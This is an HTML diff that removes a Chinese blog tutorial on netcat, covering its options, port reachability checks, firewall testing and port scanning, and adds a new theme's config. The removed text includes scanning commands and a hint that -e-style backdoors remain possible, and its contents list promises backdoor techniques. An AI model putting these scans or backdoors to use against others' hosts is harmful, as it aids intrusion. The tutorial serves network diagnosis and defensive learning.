@@ -1,557 +1,153 @@
-<!doctype html>
-<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>标签: 计算机网络 - 胡小宁的博客</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="胡小宁的博客"><meta name="msapplication-TileImage" content="/images/本人.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="胡小宁的博客"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="胡小宁的博客"><meta property="og:url" content="http://1905060202.github.io/"><meta property="og:site_name" content="胡小宁的博客"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://1905060202.github.io/img/og_image.png"><meta property="article:author" content="胡小宁"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://1905060202.github.io"},"headline":"胡小宁的博客","image":["http://1905060202.github.io/img/og_image.png"],"author":{"@type":"Person","name":"胡小宁"},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/monokai.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><script data-ad-client="1" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/%E6%9C%AC%E4%BA%BA.jpg" alt="胡小宁的博客" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于我</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">标签</a></li><li class="is-active"><a href="#" aria-current="page">计算机网络</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T15:54:54.000Z" title="2021/7/16 下午11:54:54">2021-07-16</time>发表</span><span class="level-item"><time dateTime="2021-07-16T15:59:56.482Z" title="2021/7/16 下午11:59:56">2021-07-16</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/">编程随想</a></span><span class="level-item">2 小时读完 (大约14293个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/16/netcat/">netcat</a></h1><div class="content"><h1 id="扫盲-netcat（网猫）的-N-种用法——从“网络诊断”到“系统入侵”"><a href="#扫盲-netcat（网猫）的-N-种用法——从“网络诊断”到“系统入侵”" class="headerlink" title="扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”"></a>扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”</h1><p><strong>文章目录</strong></p>
-<p>★引子<br>★netcat 是个啥玩意儿？<br>★netcat 能干啥？<br>★nc 命令行简介<br>★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达<br>★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口<br>★招数3：（渗透测试）用 nc 玩“端口扫描”<br>★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）<br>★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）<br>★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问<br>★招数7：（网络配置）基于 nc 的端口转发（Port Forward）<br>★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）<br>★招数9：（系统管理）用 nc 传输文件<br>★招数10：（系统管理）用 nc 远程备份整个磁盘<br>★招数11：（入侵手法）用 nc 开启【被动】连接型后门<br>★招数12：（入侵手法）用 nc 开启【主动】连接型后门<br>★附录：netcat 的【其它变种】</p>
-<hr>
-<h2 id="★引子"><a href="#★引子" class="headerlink" title="★引子"></a>★引子</h2><p>　　这些年来，俺在博客上写了若干“信息安全教程”，其中不免会涉及到【网络配置】。<br>　　由于读者中有很多是“技术菜鸟”，经常在配置网络的时候卡壳——有些人是因为粗心，还有些是被系统的防火墙干扰了（误导了）。<br>　　今天这篇，一个主要目的就是：教你如何用 netcat 这个牛逼的小工具进行网络诊断、网络配置、系统管理 ……<br>　　此文的另一个目的是：介绍黑客/骇客是如何利用 netcat 这个工具来辅助入侵。所谓【知己知彼】，注重安全防范的同学，也应该稍微了解一些入侵者的手法。</p>
-<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">---------------------<br>|<span class="hljs-string">      /\_/\        </span>|<br>|<span class="hljs-string">     / 0 0 \       </span>|<br>|<span class="hljs-string">    ====v====      </span>|<br>|<span class="hljs-string">     \  W  /       </span>|<br>|<span class="hljs-string">     </span>|<span class="hljs-string">     </span>|<span class="hljs-string">     _ </span>|<br>|<span class="hljs-string">     / ___ \    /  </span>|<br>|<span class="hljs-string">    / /   \ \  </span>|<span class="hljs-string">   </span>|<br>|<span class="hljs-string">   (((-----)))-&#x27;   </span>|<br>|<span class="hljs-string">    /              </span>|<br>|<span class="hljs-string">   (      ___      </span>|<br>|<span class="hljs-string">    \__.=</span>|<span class="hljs-string">___E     </span>|<br>|<span class="hljs-string">           /       </span>|<br>---------------------<br></code></pre></td></tr></table></figure>
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>标签: 计算机网络 | 胡小宁的博客</title><meta name="author" content="胡小宁"><meta name="copyright" content="胡小宁"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
+<meta property="og:title" content="胡小宁的博客">
+<meta property="og:url" content="http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/index.html">
+<meta property="og:site_name" content="胡小宁的博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:author" content="胡小宁">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '标签: 计算机网络',
+  isPost: false,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-08-01 18:36:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-<h2 id="★netcat-是个啥玩意儿？"><a href="#★netcat-是个啥玩意儿？" class="headerlink" title="★netcat 是个啥玩意儿？"></a>★netcat 是个啥玩意儿？</h2><p>　　netcat 一般简称为 nc，直译为中文就是“网猫”，被誉为——【<strong>网络上的瑞士军刀</strong>】。<br>　　它诞生于1995年，在网络安全社区的名气很大（就如同 AK47 在军事领域的名气）。长期在安全圈内混的人，应该都知道它。想当年，insecure.org 网站在本世纪初搞过几次“年度投票”，评选优秀的安全工具。每次投票，netcat 都能排进前几名。</p>
-<h2 id="★netcat-能干啥？"><a href="#★netcat-能干啥？" class="headerlink" title="★netcat 能干啥？"></a>★netcat 能干啥？</h2><h3 id="◇概述"><a href="#◇概述" class="headerlink" title="◇概述"></a>◇概述</h3><p>　　简而言之，nc 是一个【命令行】工具，能够让你很方便、很灵活地地操纵【传输层协议】（这里所说的“传输层协议”指的是 OSI 模型中的第4层，主要是 TCP ＆ UDP）。</p>
-<h3 id="◇nc-的变种"><a href="#◇nc-的变种" class="headerlink" title="◇nc 的变种"></a>◇nc 的变种</h3><p>　　由于 nc 是如此牛逼，而它本身又很小（不但软件很小，源代码也很少）。很容易就衍生出一大堆【变种】。不同的变种，会在原有 nc 的基础上增加一些新功能。<br>　　由于变种之间存在差异。在本文的开头部分，俺有必要先声明一下：<strong>这篇教程的内容，主要基于 OpenBSD 社区的变种</strong>（也叫“OpenBSD netcat”或“netcat-openbsd”）<br>　　顾名思义，这是由 OpenBSD 社区重写的 netcat，主要增加了对“IPv6、proxy、Unix sockets”等功能的支持。另外，在细节上也有若干完善。<br>　　虽然它出自 OpenBSD 社区，但很多主流 Linux 发行版的官方软件仓库已包含这个变种（比如说：Debian 家族、Arch 家族、openSUSE 家族、Gentoo 家族……）。<br>　　为了打字省力，本文后续部分提到的 nc，除非专门注明，否则都是指：netcat 的 OpenBSD 变种。如果俺要称呼【原始】的那个 netcat，俺会称之为“原版 nc”（洋文叫做“traditional netcat”）。<br>　　另，<br>　　在本文末尾，俺单独开一个章节，简单聊聊 nc 的其它几个变种。</p>
-<h2 id="★nc-命令行简介"><a href="#★nc-命令行简介" class="headerlink" title="★nc 命令行简介"></a>★nc 命令行简介</h2><p>　　要使用 nc，你就需要在【命令行】中与它打交道（它所有的功能，都以命令行的方式呈现给你用）。</p>
-<h3 id="◇nc-命令行的常规形式"><a href="#◇nc-命令行的常规形式" class="headerlink" title="◇nc 命令行的常规形式"></a>◇nc 命令行的常规形式</h3><p>　　一般来说，nc 的命令行包括如下几个部分：</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nc</span> 命令选项 主机 端口<br></code></pre></td></tr></table></figure>
-<p><strong>命令选项</strong><br>　　这部分可能包含 0~N 个选项<br>　　（注：这部分最复杂，下一个小节单独聊）<br><strong>主机</strong><br>　　这部分可能没有，可能以“点分十进制”形式表示，也可能以“域名”形式表示。<br><strong>端口</strong><br>　　这部分可能没有，可能是单个端口，可能是端口范围。<br>　　对于“端口范围”，以两个数字分别表示“开始和结束”，中间以【半角减号】相连。举例：<code>1-1024</code></p>
-<h3 id="◇何为“命令行选项”？"><a href="#◇何为“命令行选项”？" class="headerlink" title="◇何为“命令行选项”？"></a>◇何为“命令行选项”？</h3><p>　　简单来说，nc 提供了一大堆【命令行选项】，分别对应它提供的功能。每个选项都是“单字母”滴。有些选项需要带【选项值】，有些不需要。<br>　　你要使用的选项都放在 <code>nc</code> 这个命令之后，每个选项前面要有一个【半角减号】，选项之间以空格分开。<br>　　举例：<br>　　在下面这个例子中，分别用到了三个选项（<code>l、p、v</code>），其中 <code>12345</code> 是选项 <code>p</code> 所带的【选项值】。</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">12345</span> -v<br></code></pre></td></tr></table></figure>
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
-<p>　　如果你的系统中已经有 nc（且 nc 已添加到【PATH 环境变量】），在命令行中执行如下，就可以看到它支持的全部命令选项的列表。</p>
-<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc -h</span><br></code></pre></td></tr></table></figure>
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
 
-<p>　　顺便说一下：在上述命令的输出中，如果第一行包含 <code>OpenBSD</code> 这个单词，就说明你当前用的“网猫”是 OpenBSD 变种。</p>
-<h3 id="◇【常用的】命令行选项"><a href="#◇【常用的】命令行选项" class="headerlink" title="◇【常用的】命令行选项"></a>◇【常用的】命令行选项</h3><p>　　由于上述命令显示的帮助是洋文。为了照顾新手，俺稍作解释（只列出【常用的】那些）。</p>
-<table>
-<thead>
-<tr>
-<th>选项</th>
-<th>是否有“选项值”</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>h</td>
-<td>NO</td>
-<td>输出 nc 的帮助</td>
-</tr>
-<tr>
-<td>v</td>
-<td>NO</td>
-<td>在网络通讯时，显示详细的输出信息 注：建议新手多用该选项，出错时帮你诊断问题</td>
-</tr>
-<tr>
-<td>n</td>
-<td>NO</td>
-<td>对命令行中的“主机”，【不】进行域名解析 注：如果“主机”是“点分格式”的 IP 地址，需要用该选项； 如果“主机”是“域名”形式，【不能】用该选项</td>
-</tr>
-<tr>
-<td>p</td>
-<td>YES</td>
-<td>指定“端口号”</td>
-</tr>
-<tr>
-<td>l</td>
-<td>NO</td>
-<td>开启“监听模式”，nc 作为【服务端】 注：如不加该选项，nc 默认作为客户端</td>
-</tr>
-<tr>
-<td>u</td>
-<td>NO</td>
-<td>使用 UDP 协议 注：如不加该选项，默认是 TCP 协议</td>
-</tr>
-<tr>
-<td>w</td>
-<td>YES</td>
-<td>设置连接的超时间隔（N 秒）</td>
-</tr>
-<tr>
-<td>q</td>
-<td>YES</td>
-<td>让 nc 延时（N 秒）再退出</td>
-</tr>
-<tr>
-<td>z</td>
-<td>NO</td>
-<td>开启“zero-I/O 模式” 注：该选项仅用于“端口扫描”，后面会聊到</td>
-</tr>
-<tr>
-<td>k</td>
-<td>NO</td>
-<td>配合 <code>-l</code> 选项使用，可以重复接受客户端连接。 注：“原版 nc”的该选项用来开启“TCP keepalive” 这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
-</tr>
-<tr>
-<td>X</td>
-<td>YES</td>
-<td>指定代理的类型（具体用法，后面会聊到） 注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
-</tr>
-<tr>
-<td>x</td>
-<td>YES</td>
-<td>以 <code>IP:port</code> 的格式指定代理的位置。 注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
-</tr>
-<tr>
-<td>e</td>
-<td>YES</td>
-<td>启动某个进程，把该进程的“标准输入输出”与网络通讯【对接】 注：通常用该选项开启一个网络后门 “OpenBSD 变种”基于安全考虑，已去掉该选项， 但还是能用间接的方式达到同样的效果 :)</td>
-</tr>
-</tbody></table>
-<p>　　汇总上述表格，只是用来【速查】。俺会在后续章节具体介绍每个命令选项的详细用法。</p>
-<h3 id="◇命令行选项的【合写】形式"><a href="#◇命令行选项的【合写】形式" class="headerlink" title="◇命令行选项的【合写】形式"></a>◇命令行选项的【合写】形式</h3><p>　　有时候要同时用到多个选项，可以“合写在一起”，在前面共用一个【半角减号】。<br>　　还拿刚才俺举的例子，以下几种写法是【等价】滴。</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lp <span class="hljs-number">12345</span> -v<br><span class="hljs-attribute">nc</span> -l -v -p <span class="hljs-number">12345</span><br><span class="hljs-attribute">nc</span> -lv -p <span class="hljs-number">12345</span><br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure>
-
-
-<h3 id="◇如何强行终止-nc？"><a href="#◇如何强行终止-nc？" class="headerlink" title="◇如何强行终止 nc？"></a>◇如何强行终止 nc？</h3><p>　　一般来说，在命令行环境下，你可以用【Ctrl C】这个组合键来强行终止当前运行的进程。<br>　　对 nc，你同样可以这么干。</p>
-<h2 id="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达"><a href="#★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达" class="headerlink" title="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达"></a>★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达</h2><h3 id="◇使用场景"><a href="#◇使用场景" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　经常有这种需求，要判断某个主机的监听端口是否能连上。<br>　　导致监听端口【无法】，通常有两种原因：<br>其一，这个监听端口根本就【没开启】；<br>其二，监听端口虽然开启，但是被防火墙阻拦了。<br>　　对第1个原因，（如果你能在该主机上运行命令）可以直接用 <code>netstat</code> 这个命令查看监听端口是否开启<br>　　但对于第2个原因，<code>netstat</code> 就用不上了。这时候就可以用 nc 来帮你搞定。</p>
-<h3 id="◇方法"><a href="#◇方法" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　用如下命令可以测试某个 IP 地址（<code>x.x.x.x</code>）上的某个监听端口（<code>xx</code>）是否开启。</p>
-<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -nv <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xx<br></code></pre></td></tr></table></figure>
-
-<p>　　上述命令用到了如下几个选项：</p>
-<p><strong>选项 <code>-v</code></strong><br>　　如果你是 nc 的新手，俺建议总是带上这个选项——通过更详细的输出，能帮你搞明白状况。<br>　　在本文后续的举例中，俺会尽量都加上这个选项（但这段话就不再重复唠叨啦）</p>
-<p><strong>选项 <code>-n</code></strong><br>　　由于测试的是【IP 地址】，用该选项告诉 nc，【无须】进行域名（DNS）解析；<br>　　反之，如果你要测试的主机是基于【域名】，就【不能】用“选项 -n”。</p>
-<h3 id="◇补充说明：超时设置"><a href="#◇补充说明：超时设置" class="headerlink" title="◇补充说明：超时设置"></a>◇补充说明：超时设置</h3><p>　　在测试链接的时候，如果你【没】使用 <code>-w</code> 这个超时选项，默认情况下 nc 会等待很久，然后才告诉你连接失败。<br>　　如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加“<code>-w</code> 选项”，设置一个比较小的超时值。在下面的例子中，超时值设为3秒。</p>
-<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -nv -w <span class="hljs-number">3</span> <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xx<br></code></pre></td></tr></table></figure>
-
-
-<h3 id="◇补充说明：UDP"><a href="#◇补充说明：UDP" class="headerlink" title="◇补充说明：UDP"></a>◇补充说明：UDP</h3><p>　　通常情况下，要测试的端口都是 TCP 协议的端口；如果你碰到特殊情况，需要测试某个 UDP 的端口是否可达。nc 同样能胜任。只需要追加 <code>-u</code> 选项。</p>
-<h2 id="★招数2：（网络诊断）判断防火墙是否“允许-or-禁止”某个端口"><a href="#★招数2：（网络诊断）判断防火墙是否“允许-or-禁止”某个端口" class="headerlink" title="★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口"></a>★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口</h2><h3 id="◇使用场景-1"><a href="#◇使用场景-1" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　前一个章节（招数1）的场景是——已经有某个网络软件开启了监听端口，然后用 nc 测试端口是否可达。<br>　　现在换另一个场景：<br>　　假设你正在配置防火墙规则，禁止 TCP 的 <code>8080</code> 端口对外监听。那么，你如何【验证】自己的配置是 OK 滴？<br>　　更进一步说：如果当前【没有】任何软件开启 <code>8080</code> 这个监听端口，你如何判断：该端口号是否会被防火墙阻拦？<br>　　为了叙述方便，设想如下场景：<br>有两台主机——“主机C”充当客户端，“主机S”充当服务端。<br>然后要判断“主机S”上的防火墙是否会拦截其它主机对 <code>8080</code> TCP 端口的连接。</p>
-<h3 id="◇方法-1"><a href="#◇方法-1" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　在“主机S”上运行 nc，让它在 8080 端口，命令如下：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lv -p <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>选项 <code>-l</code></strong><br>　　这个选项会让 nc 进入监听模式。</p>
-<p><strong>选项 <code>-p</code></strong><br>　　这个选项有“选项值”，也就是具体端口号。</p>
-<p>　　然后在“主机C”上运行 nc，测试“主机S”上的 8080 端口是否可达（具体的命令行参见前一章节“招数1”）</p>
-<h3 id="◇补充说明：是否省略“-p”？"><a href="#◇补充说明：是否省略“-p”？" class="headerlink" title="◇补充说明：是否省略“-p”？"></a>◇补充说明：是否省略“-p”？</h3><p>　　某些 nc 的变种，在开启监听模式时，可以省略“<code>-p</code>”，上述命令变为如下：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lv <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>
-<p>　　但考虑到兼容性，（在后续章节中）俺总是写上 <code>-p</code> 选项。</p>
-<h3 id="◇补充说明：如何让-nc-的监听端口【持续开启】"><a href="#◇补充说明：如何让-nc-的监听端口【持续开启】" class="headerlink" title="◇补充说明：如何让 nc 的监听端口【持续开启】"></a>◇补充说明：如何让 nc 的监听端口【持续开启】</h3><p>　　在默认情况下，nc 开启 listen 模式充当服务端，在接受【第一次】客户端连接之后，就会把监听端口关闭。<br>　　为啥会这样捏？因为当年设计 nc 更多的是作为某种网络诊断/配置工具，并【不是】真拿它当服务端软件来用的。<br>　　如果你想要让 nc 始终监听模式，使之能【重复】接受客户端发起的连接，可以追加 <code>-k</code> 选项。</p>
-<h3 id="◇补充说明：UDP-1"><a href="#◇补充说明：UDP-1" class="headerlink" title="◇补充说明：UDP"></a>◇补充说明：UDP</h3><p>　　上述举例是基于 TCP 协议。如果你要测试 UDP 协议，要记得【两边】的 nc 都要追加 <code>-u</code> 选项。</p>
-<h2 id="★招数3：（渗透测试）用-nc-玩“端口扫描”"><a href="#★招数3：（渗透测试）用-nc-玩“端口扫描”" class="headerlink" title="★招数3：（渗透测试）用 nc 玩“端口扫描”"></a>★招数3：（渗透测试）用 nc 玩“端口扫描”</h2><h3 id="◇使用场景-2"><a href="#◇使用场景-2" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　在“招数1”里面介绍了：如何测试【单个】端口是否可达。<br>　　扩展一下：如果你要测试的不止一个端口，而是某个【范围】的端口。这种行为有个专门的术语叫【端口扫描】。<br>　　“端口扫描”是一把双刃剑——“黑帽子”用这招进行信息收集，为后续的入侵做铺垫；“白帽子”用这招来进行“渗透测试”，以排查自己系统中【尚未屏蔽】的对外监听端口。<br>　　作为一款牛逼的网络瑞士军刀，nc 当然可以用来干这事儿啦。<br>　　顺便说一下：<br>不论是 TCP 还是 UDP，协议规定的【有效】端口号范围都是：<code>1</code> ~ <code>65535</code></p>
-<h3 id="◇方法-2"><a href="#◇方法-2" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　下面这个命令，用来扫描 IP 地址为 <code>x.x.x.x</code> 的主机，扫描的端口范围从 <code>1</code> 到 <code>1024</code></p>
-<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -znv <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> <span class="hljs-number">1</span><span class="hljs-number">-1024</span><br></code></pre></td></tr></table></figure>
-
-<p><strong>选项 <code>-z</code></strong><br>　　意思是：开启“zero-I/O 模式”。该模式指的是：nc 只判断某个监听端口是否能连上，连上后【不】与对端进行数据通讯。<br><strong>选项 <code>-n</code></strong><br>　　（前面已聊过，参见“招数1”）<br><strong>选项 <code>-v</code></strong><br><code>-v</code> 选项前面也聊过，这里要特地强调一下。<br>　　对 nc 的其它用法，<code>-v</code> 选项是可加可不加滴；但对于“端口扫描”而言，一定要有这个选项——否则你【看不到】扫描结果。</p>
-<h3 id="◇补充说明：优化输出"><a href="#◇补充说明：优化输出" class="headerlink" title="◇补充说明：优化输出"></a>◇补充说明：优化输出</h3><p>　　玩“端口扫描”的时候，“<code>-v</code> 选项”会把“成功/失败”的结果统统打印出来。<br>　　通常大伙儿关注的都是“扫描成功”的那些端口。因此，可以用如下命令过滤一下，只打印扫出来的端口。</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -znv x.x.x.x <span class="hljs-number">1</span>-<span class="hljs-number">1024</span>  <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | grep succeeded<br></code></pre></td></tr></table></figure>
-<p>　　由于“<code>-v</code> 选项”产生的输出位于【stderr】，上述命令中的 <code>2&gt;&amp;1</code> 用来把【stderr】合并到【stdout】（注：这种写法只适用于 POSIX 系统上的 shell）<br><code>grep</code> 命令用来进行【过滤】。对于 Windows 系统，默认【没有】<code>grep</code> 命令，需改用 <code>find</code> 命令过滤。</p>
-<h3 id="◇补充说明：超时设置-1"><a href="#◇补充说明：超时设置-1" class="headerlink" title="◇补充说明：超时设置"></a>◇补充说明：超时设置</h3><p>　　如果你要扫描的端口范围，跨度比较大，超时值要【恰到好处】——<br>超时值太大，会浪费时间；超时值太小，可能会遗漏某些端口（端口本身开放，但 nc 还没来得及连上就超时了）<br>　　具体如何设置，参见“招数1”的“补充说明”。</p>
-<h3 id="◇补充说明：【并发】扫描"><a href="#◇补充说明：【并发】扫描" class="headerlink" title="◇补充说明：【并发】扫描"></a>◇补充说明：【并发】扫描</h3><p>　　如果你设置了较小的超时值，依然嫌慢，还可以用【并发】扫描的方式，进一步提升效率。<br>　　简而言之就是：同时运行多个 nc，分别扫描不同的端口范围。</p>
